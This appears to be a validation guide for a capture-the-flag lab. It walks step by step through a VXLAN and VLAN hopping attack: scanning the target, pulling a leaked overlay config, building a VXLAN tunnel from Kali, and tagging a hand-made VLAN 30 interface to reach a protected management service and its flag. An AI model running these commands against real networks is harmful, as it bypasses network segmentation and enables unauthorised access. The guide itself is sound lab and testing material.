# VXLAN VLAN Hopping Validation Guide

This guide validates external access to an exposed VXLAN overlay, DHCP lease acquisition on the user VLAN, VLAN 30 interface creation, and access to the protected management service.

---

## 1. Discover the Exposed Services

Scan the target for the exposed VXLAN UDP port and the configuration web service.

```bash
sudo nmap -Pn -n -sU -p 4789 203.0.0.198
sudo nmap -Pn -n -sT -p 8088 203.0.0.198
```

### Expected Results

```text
4789/udp open|filtered
8088/tcp open
```

---

## 2. Retrieve the Leaked Overlay Configuration

Download the exposed backup configuration file:

```bash
curl http://203.0.0.198:8088/backup.conf
```

### Expected Response

```text
VXLAN_PORT=4789
VXLAN_VNI=200
ACCESS_PROFILE=user-edge
```

---

## 3. Create the VXLAN Interface

Define the target IP address and the leaked VXLAN configuration:

```bash
export TARGET_IP="203.0.0.198"
export VXLAN_PORT="4789"
export VXLAN_VNI="200"
```

Automatically identify the Kali network interface used to reach the target:

```bash
export KALI_IF="$(
  ip route get "$TARGET_IP" |
  awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}'
)"
```

Remove any previously created VXLAN or VLAN interfaces:

```bash
sudo ip link delete vxlan200.30 2>/dev/null || true
sudo ip link delete vxlan200 2>/dev/null || true
```

Create the VXLAN interface:

```bash
sudo ip link add vxlan200 \
  type vxlan \
  id "$VXLAN_VNI" \
  remote "$TARGET_IP" \
  dstport "$VXLAN_PORT" \
  dev "$KALI_IF"
```

Bring the interface online:

```bash
sudo ip link set vxlan200 up
```

### Verify the VXLAN Interface

```bash
ip -d link show vxlan200
```

---

## 4. Obtain a DHCP Lease on VLAN 10

Release any existing DHCP lease associated with the VXLAN interface:

```bash
sudo dhclient -r vxlan200 2>/dev/null || true
```

Request a new DHCP lease:

```bash
sudo dhclient -1 -v vxlan200
```

### Verify the Assigned Address

```bash
ip -4 addr show vxlan200
ip route show dev vxlan200
```

The interface should receive an IP address within the following range:

```text
10.20.10.100–10.20.10.150
```

---

## 5. Enumerate VLAN 10

Use `arp-scan` to identify active hosts on the local VLAN:

```bash
sudo arp-scan --interface=vxlan200 --localnet
```

### Alternative Using Nmap

If `arp-scan` is unavailable:

```bash
sudo nmap -Pn -n -sn 10.20.10.0/24 -e vxlan200
```

Scan all TCP ports on the discovered subnet:

```bash
sudo nmap -Pn -n -sT \
  -p- \
  --min-rate 1000 \
  10.20.10.0/24 \
  -e vxlan200
```

### Inspect the DHCP Lease Information

```bash
cat /var/lib/dhcp/dhclient.leases
```

The DHCP information or discovered services should contain clues indicating that the protected network uses:

```text
VLAN ID: 30
Subnet: 10.20.30.0/24
```

---

## 6. Create the Malicious VLAN 30 Interface

Create an IEEE 802.1Q VLAN interface using VLAN ID `30` on top of the VXLAN interface:

```bash
sudo ip link add link vxlan200 \
  name vxlan200.30 \
  type vlan id 30
```

Bring the VLAN interface online:

```bash
sudo ip link set vxlan200.30 up
```

Assign a static IP address within the protected management subnet:

```bash
sudo ip addr add 10.20.30.50/24 dev vxlan200.30
```

### Verify the VLAN Interface

```bash
ip -d link show vxlan200.30
ip -4 addr show vxlan200.30
```

---

## 7. Enumerate the Protected Management VLAN

Use `arp-scan` to identify hosts within VLAN 30:

```bash
sudo arp-scan \
  --interface=vxlan200.30 \
  10.20.30.0/24
```

### Alternative Using Nmap

```bash
sudo nmap -Pn -n -sn \
  10.20.30.0/24 \
  -e vxlan200.30
```

Scan all TCP ports on the management subnet:

```bash
sudo nmap -Pn -n -sT \
  -p- \
  --min-rate 1000 \
  10.20.30.0/24 \
  -e vxlan200.30
```

---

## 8. Access the Protected Management Service

The expected management host is:

```text
10.20.30.10
```

Access the protected service through the VLAN 30 interface:

```bash
curl --interface vxlan200.30 \
  http://10.20.30.10:8080/
```

The service should return the protected management response and the challenge flag.

---

## 9. Cleanup on Kali

Release the DHCP lease:

```bash
sudo dhclient -r vxlan200 2>/dev/null || true
```

Delete the VLAN 30 interface:

```bash
sudo ip link delete vxlan200.30 2>/dev/null || true
```

Delete the VXLAN interface:

```bash
sudo ip link delete vxlan200 2>/dev/null || true
```

---

## Validation Status

The setup is currently functioning.

The next meaningful validation step is to confirm that the external Kali machine successfully receives a DHCP lease through the VXLAN tunnel.

A successful validation should show:

* The `vxlan200` interface is created and operational.
* DHCP traffic traverses the VXLAN tunnel.
* Kali receives an address from `10.20.10.100–10.20.10.150`.
* VLAN 10 hosts can be enumerated.
* The VLAN 30 interface can reach `10.20.30.0/24`.
* The protected service at `10.20.30.10:8080` is accessible.
